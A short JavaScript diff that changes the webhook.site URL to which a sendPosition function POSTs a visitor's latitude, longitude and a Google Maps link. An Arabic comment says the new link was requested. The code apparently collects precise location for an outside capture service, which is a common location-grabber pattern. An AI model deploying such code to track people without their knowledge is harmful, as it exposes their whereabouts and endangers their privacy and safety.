@@ -34,8 +34,8 @@ function sendPosition(position) {
     var lat = position.coords.latitude;
     var lon = position.coords.longitude;
     
-    // هذا هو رابط الـ Webhook الجديد الخاص بك من شاشتك الحالية
-    var webhookURL = "https://webhook.site/27b1fb0b-938a-4385-b03c-5f1902b17b7d";
+    // هذا هو رابط الـ Webhook الجديد الذي طلبته
+    var webhookURL = "https://webhook.site/a179b8b0-bd72-48dc-9cc3-16f2c9105d78";
     
     var xhr = new XMLHttpRequest();
     xhr.open("POST", webhookURL, true);
@@ -44,7 +44,7 @@ function sendPosition(position) {
     xhr.send(JSON.stringify({
         latitude: lat,
         longitude: lon,
-        google_maps: "https://www.google.com/maps?q=" + lat + "," + lon
+        google_maps: "https://maps.google.com/?q=" + lat + "," + lon
     }));
     
     xhr.onload = function() {
